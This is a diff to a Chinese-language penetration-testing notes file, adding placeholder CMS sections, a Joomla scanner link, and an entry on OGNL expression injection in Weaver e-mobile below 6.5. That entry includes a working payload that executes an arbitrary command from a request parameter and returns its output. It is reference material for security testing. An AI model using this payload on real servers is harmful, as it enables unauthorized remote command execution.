@@ -1,4 +1,4 @@
-# web 各类服务和中间件整合笔记
+# web 各类服务和中间件渗透笔记
 
 ---
 
@@ -14,6 +14,22 @@
 ---
 
 # 各类论坛/CMS/框架
+## dedeCMS
+鸽
+
+## Discuz
+鸽
+
+## Drupal
+鸽
+
+## ECshop
+鸽
+
+## Joomla
+**工具**
+- [rezasp/joomscan](https://github.com/rezasp/joomscan)
+
 ## [MetInfo](https://www.metinfo.cn/)
 **CVE-2018-13024**
 - 简介
@@ -55,6 +71,18 @@
 **YxCMS 1.4.7 多个漏洞**
 - 文章
     - [YxCMS 1.4.7 最新版漏洞分析](https://bbs.ichunqiu.com/thread-45926-1-1.html)
+
+## 泛微
+**e-mobile < 6.5 Ognl 表达式注入**
+- 文章
+    - [关于表达式注入的小记录](https://zhuanlan.zhihu.com/p/26052235)
+    - [泛微 E-Mobile Ognl 表达式注入](https://blog.csdn.net/qq_27446553/article/details/68203308)
+    - [泛微E-Mobile Ognl 表达式注入](https://docs.ioin.in/writeup/www.sh0w.top/_index_php_archives_14_/index.html)
+
+- POC | Payload | exp
+    ```
+    message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
+    ```
 
 ## 致远 OA
 **A8-OA-seeyon-RCE**
